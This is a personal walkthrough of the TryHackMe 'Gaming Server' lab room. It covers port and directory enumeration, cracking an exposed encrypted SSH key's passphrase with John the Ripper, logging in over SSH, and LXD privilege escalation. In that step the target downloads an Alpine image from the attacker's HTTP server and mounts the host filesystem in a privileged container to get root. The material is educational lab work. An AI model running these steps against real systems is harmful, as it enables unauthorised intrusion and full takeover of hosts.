# Gaming Server

This is my write-up for the room [Gaming Server]Basic Pentesting] (https://tryhackme.com/room/gamingserver)

Description: Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.


## Difficulty
My Difficulty: VERY Easy

Try Hackme Difficulty:

![80d16a6756c805903806f7ecbdd80f6d](https://user-images.githubusercontent.com/68706090/164374344-524a6bee-7187-4762-ae57-6ba8eacc7d51.jpeg)


# Emumeration

### NMAP

```console
oob2uub@kali:~/Documents/tryhackme/GaminServer$ sudo nmap -sC -sV -A -T4 10.10.113.84
[sudo] password for noob2uub: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-20 21:01 PDT
Nmap scan report for 10.10.113.84
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: House of danak
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/20%OT=22%CT=1%CU=38097%PV=Y%DS=4%DC=T%G=Y%TM=6260D72
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   15.68 ms  10.13.0.1
2   ... 3
4   153.95 ms 10.10.113.84

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.60 seconds
```

GOBUSTER

```console
===============================================================
noob2uub@kali:~/Documents/tryhackme/GaminServer$ gobuster dir -u http://10.10.113.84 -w /home/noob2uub/Documents/Wordlists/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.113.84
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/noob2uub/Documents/Wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/20 21:07:37 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 2762]
/robots.txt           (Status: 200) [Size: 33]  
/secret               (Status: 301) [Size: 313] [--> http://10.10.113.84/secret/]
/server-status        (Status: 403) [Size: 277]                                  
/uploads              (Status: 301) [Size: 314] [--> http://10.10.113.84/uploads/]
                                                                                  
===============================================================
2022/04/20 21:09:57 Finished
===============================================================

```

### Uploads 

```
Index of /uploads
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	-	 
[   ]	dict.lst	2020-02-05 14:10	2.0K	 
[TXT]	manifesto.txt	2020-02-05 13:05	3.0K	 
[IMG]	meme.jpg	2020-02-05 13:32	15K	 
Apache/2.4.29 (Ubuntu) Server at 10.10.113.84 Port 80
```

We see a word list and a few other items that I am not sure is important

### Secret

```console
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

Recived the RSA Key and a word list.  But we still need a user name lets dig around.

Looking at the source code I found a user name, John

```console
					<a href="#" class="archives">&nbsp;</a>
				</li>
			</ul>
		</div>
	</div>
</body>
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
</html>
```
Converting the RSA to a HASH

SSH2JOHN

```console
noob2uub@kali:~/Documents/tryhackme/GaminServer$ /usr/share/john/ssh2john.py key.key > hash.hash
noob2uub@kali:~/Documents/tryhackme/GaminServer$ ls
dict.lst  hash.hash  key.key
noob2uub@kali:~/Documents/tryhackme/GaminServer$ cat hash.hash
key.key:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba0318e39e6f238eb5ce231be0d624f58255e6ec1caf1e107e53f6436564f298711f83fe3cb6fbf6709cd12ac138f065074577a632c96dfda129b65acc52edab816366aeba68b2c8af6751c3be0ccc748c1739c523b8ecc581703d4a99b64cf9b13717d5a7dc87e214e7f21de334d3b023bcaaab3aaafe5090c5d51acefb1769122da7f1d2625d72ebbfe5a477363355b65b8a672897227b245e20b4d7e627864aa3978232edf1339f6a999ca28f54fbfcf739440a31114b2b1b50a61c7271649c1d43c2e244c43fdeac64622c160e1ae31ab5cf84a1a80a906a52666e05b5c20e22bc317b20a1237daf26cf56f773d4a8732008919712963bfc834c5106a10dfdf09e5561042d745161fda6220eba934d4a48d26eb2313a058984872913d04b5541389dd00c8b7b74e4c635534928effbef8739dd79971685527749d708031e20ff90ff62a70bb6dfed29b2f2bb2820936dcdceeb299db530656a28e5fbe0fa312046e77dd2ce1d0d630451119d0765adc3bb982458638a3c3cb70f16c1a3c71d0798b4782bb708660bf80b8f583102ae77d900209971a86b35dddc878546d181ebe1cb0e5f15443cf5ff889985a7c30b682284a7963a398b87cdd0a8ac1ae2cd57201e8128f652fce83233844c9cddee666bf5ac33cbfb4cb3b7a03904710d5df90d7c5591590c6f2ad8869522e6cb03cfe4e1e7bf49b36f5e901b412cd453e5c615721edfd62a569565f4ddac99de4e7f14bb7bd9f363057fe7af6dd30f64cc7d5dcdc8c7bfe115e23109da0c3788baf01a1915005ca0968eb9f9cb9130b4847c4ded3fedfd0bdc688b1648559d830c276056899dc1de123eddd619e6b008a26fbf437f2dfce3f9678d932d5f5357204821cd08f981af131671def2e983371e42ab91a960dd4152d7d6158aad906727bf32d224cd3b44082a03e48f018f250a75def2037e36fffdfbffbfba279f785b4e9aba435369117ebf49859631f5390bc13a8e3f45d68eab9f58d1085d7229c1715cb6965a110702e342e96c11930e25564d0cb1f00b88e9839f22dfa4eb87c6aed7e358f56fdf218e2668aa40e6bcfe90c682d34f827266145ac1cb6777ecacd2a0da5395799e4ff76b91e4da3fa616453cfc21e83e7e656db2041e959438e26872d2f138f28f762b18f7b8007a8d9a7c8f18000a970d06dde2b20ec7fddabaa18893b4226b2f721cb53ac4b815bc804dfb51b491a93ba3f45a32fb29c698d3f1e4741e0b968efc6a1e487d057a54e47102a20c3c47abb98b3096493b4a2a7497ece89b7f24ee20cdd061dc9b74801a0a9d731563b3f9bbc75aff8b15fa4244f7dc7b0e1f185e78f502cda063e30c40756ebc2a67c1147b5cb98af058f74d953e5872b93fa5b97cb2bbbb7315b757aa1337f6ea58216e71149f5eca2aef9543a11d20f2f5e741d292ce55fb67c2f094d0d5f977ac8f6fa303cfb82f1a363f9042ee66eb903952b9abf18d35fd68ea9f6c02eeea71cedea134120c6dc36b9dd66483cd1f78a67c443ef013b131965da1bf748130c093e59ac116ae7889ad28853850f219253ea62175279b910b54e473d887e10bfef5352fd3df1afd338a9b2d81b2c53923e9f869a49674698a1697686617b2829f5ef03118254885b6962c0a790326c88971f2056b1b85b49130af8f
```

Now cracking the Hash with John

```console

noob2uub@kali:~/Documents/tryhackme/GaminServer$ john --wordlist=dict.lst hash.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (id_rsa)     
1g 0:00:00:00 DONE (2022-04-20 21:24) 100.0g/s 22200p/s 22200c/s 22200C/s 2003..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now lets SSH into the system

```console
noob2uub@kali:~/Documents/tryhackme/GaminServer$ chmod 777 id_rsa
noob2uub@kali:~/Documents/tryhackme/GaminServer$ ssh -i id_rsa john@10.10.113.84
load pubkey "id_rsa": invalid format
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0777 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
john@10.10.113.84's password: 
Permission denied, please try again.
john@10.10.113.84's password: 
Permission denied, please try again.
john@10.10.113.84's password: 
john@10.10.113.84: Permission denied (publickey,password).
noob2uub@kali:~/Documents/tryhackme/GaminServer$ chmod 600 id_rsa
noob2uub@kali:~/Documents/tryhackme/GaminServer$ ssh -i id_rsa john@10.10.113.84
load pubkey "id_rsa": invalid format
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Apr 21 04:26:45 UTC 2022

  System load:  0.0               Processes:           98
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 16%               IP address for eth0: 10.10.113.84
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.

```

you can see that it did not like the chmod 777 so I had to change it to 600 so only that user has access to it. 

I couldnt run SUDO so lets see what I have access too

```console
john@exploitable:/$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
john@exploitable:/$ 
```

everything seems normal but LXD that may be something to look into.  I found this walkthrough and it was able to get me root.

https://www.hackingarticles.in/lxd-privilege-escalation/

### pulling down the LXD Exploit

```console

noob2uub@kali:~/Documents/tryhackme/GaminServer$ git clone  https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
Receiving objects: 100% (50/50), 3.11 MiB | 11.18 MiB/s, done.
Resolving deltas: 100% (15/15), done.
noob2uub@kali:~/Documents/tryhackme/GaminServer$ cd lxd-alpine-builder
noob2uub@kali:~/Documents/tryhackme/GaminServer/lxd-alpine-builder$ ./build-alpine
build-alpine: must be run as root
noob2uub@kali:~/Documents/tryhackme/GaminServer/lxd-alpine-builder$ sudo ./build-alpine
[sudo] password for noob2uub: 
Determining the latest release... v3.15
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.15/main/x86_64
Downloading alpine-keys-2.4-r1.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-2.12.7-r3.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
Verified OK
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2575  100  2575    0     0   1043      0  0:00:02  0:00:02 --:--:--  1042
--2022-04-20 21:37:24--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106
Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2575 (2.5K) [text/plain]
Saving to: ‘/home/noob2uub/Documents/tryhackme/GaminServer/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’

/home/noob2uub/Documents/tryhac 100%[=======================================================>]   2.51K  --.-KB/s    in 0s      

2022-04-20 21:37:24 (380 MB/s) - ‘/home/noob2uub/Documents/tryhackme/GaminServer/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2575/2575]

Selecting mirror http://mirror1.ku.ac.th/alpine//v3.15/main
fetch http://mirror1.ku.ac.th/alpine//v3.15/main/x86_64/APKINDEX.tar.gz
(1/20) Installing musl (1.2.2-r7)
(2/20) Installing busybox (1.34.1-r5)
Executing busybox-1.34.1-r5.post-install
(3/20) Installing alpine-baselayout (3.2.0-r18)
Executing alpine-baselayout-3.2.0-r18.pre-install
Executing alpine-baselayout-3.2.0-r18.post-install
(4/20) Installing ifupdown-ng (0.11.3-r0)
(5/20) Installing openrc (0.44.7-r5)
Executing openrc-0.44.7-r5.post-install
(6/20) Installing alpine-conf (3.13.1-r0)
(7/20) Installing ca-certificates-bundle (20211220-r0)
(8/20) Installing libcrypto1.1 (1.1.1n-r0)
(9/20) Installing libssl1.1 (1.1.1n-r0)
(10/20) Installing libretls (3.3.4-r3)
(11/20) Installing ssl_client (1.34.1-r5)
(12/20) Installing zlib (1.2.12-r0)
(13/20) Installing apk-tools (2.12.7-r3)
(14/20) Installing busybox-suid (1.34.1-r5)
(15/20) Installing busybox-initscripts (4.0-r5)
Executing busybox-initscripts-4.0-r5.post-install
(16/20) Installing scanelf (1.3.3-r0)
(17/20) Installing musl-utils (1.2.2-r7)
(18/20) Installing libc-utils (0.7.2-r3)
(19/20) Installing alpine-keys (2.4-r1)
(20/20) Installing alpine-base (3.15.4-r0)
Executing busybox-1.34.1-r5.trigger
OK: 9 MiB in 20 packages
noob2uub@kali:~/Documents/tryhackme/GaminServer/lxd-alpine-builder$ python -m SimpleHTTPServer
bash: python: command not found
noob2uub@kali:~/Documents/tryhackme/GaminServer/lxd-alpine-builder$ python3 -m SimpleHTTPServer
/usr/bin/python3: No module named SimpleHTTPServer
noob2uub@kali:~/Documents/tryhackme/GaminServer/lxd-alpine-builder$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.113.84 - - [20/Apr/2022 21:38:57] code 404, message File not found
10.10.113.84 - - [20/Apr/2022 21:38:57] "GET /apline-v3.10-x86_64-20191008_1227.tar.gz HTTP/1.1" 404 -
10.10.113.84 - - [20/Apr/2022 21:40:05] code 404, message File not found
10.10.113.84 - - [20/Apr/2022 21:40:05] "GET /apline-v3.10-x86_64-20191008_1227.tar.gzalpine-v3.15-x86_64-20220420_2137.tar.gz HTTP/1.1" 404 -
10.10.113.84 - - [20/Apr/2022 21:40:15] "GET /alpine-v3.15-x86_64-20220420_2137.tar.gz HTTP/1.1" 200 -
10.10.113.84 - - [20/Apr/2022 21:40:37] "GET /alpine-v3.13-x86_64-20210218_0139.tar.gz HTTP/1.1" 200 -
```
# Privledge Escalation

### LXD Priv Esc

running the exploit on the victim machine

 ```console
 john@exploitable:~$ wget http://10.13.27.142:8000/apline-v3.10-x86_64-20191008_1227.tar.gz
--2022-04-21 04:37:55--  http://10.13.27.142:8000/apline-v3.10-x86_64-20191008_1227.tar.gz
Connecting to 10.13.27.142:8000... connected.
HTTP request sent, awaiting response... 404 File not found
2022-04-21 04:37:55 ERROR 404: File not found.

john@exploitable:~$ wget http://10.13.27.142:8000/apline-v3.10-x86_64-20191008_1227.tar.gzalpine-v3.15-x86_64-20220420_2137.tar.gz
--2022-04-21 04:39:03--  http://10.13.27.142:8000/apline-v3.10-x86_64-20191008_1227.tar.gzalpine-v3.15-x86_64-20220420_2137.tar.gz
Connecting to 10.13.27.142:8000... connected.
HTTP request sent, awaiting response... 404 File not found
2022-04-21 04:39:03 ERROR 404: File not found.

john@exploitable:~$ wget http://10.13.27.142:8000/alpine-v3.15-x86_64-20220420_2137.tar.gz
--2022-04-21 04:39:13--  http://10.13.27.142:8000/alpine-v3.15-x86_64-20220420_2137.tar.gz
Connecting to 10.13.27.142:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3261788 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.15-x86_64-20220420_2137.tar.gz’

alpine-v3.15-x86_64-20220420_21 100%[=======================================================>]   3.11M   573KB/s    in 7.4s    

2022-04-21 04:39:21 (430 KB/s) - ‘alpine-v3.15-x86_64-20220420_2137.tar.gz’ saved [3261788/3261788]

john@exploitable:~$ wget http://10.13.27.142:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz 
--2022-04-21 04:39:36--  http://10.13.27.142:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.13.27.142:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_64-20210218_01 100%[=======================================================>]   3.11M  1.54MB/s    in 2.0s    

2022-04-21 04:39:38 (1.54 MB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]

john@exploitable:~$ lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
Error: open ./alpine-v3.10-x86_64-20191008_1227.tar.gz: no such file or directory
john@exploitable:~$ lxc image import ./alpine-v3.15-x86_64-20220420_2137.tar.gz --alias myimage
Image imported with fingerprint: b9db1f266a5fe524e4c00f6d1f99abf14541be9a25072415faa2fbcd0fb281e7
john@exploitable:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | b9db1f266a5f | no     | alpine v3.15 (20220420_21:37) | x86_64 | 3.11MB | Apr 21, 2022 at 4:40am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:~$ lxc start ignite
john@exploitable:~$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # whoami
root
~ # 
```

Of course the root flag was a pain in the butt to find, but I found it. 

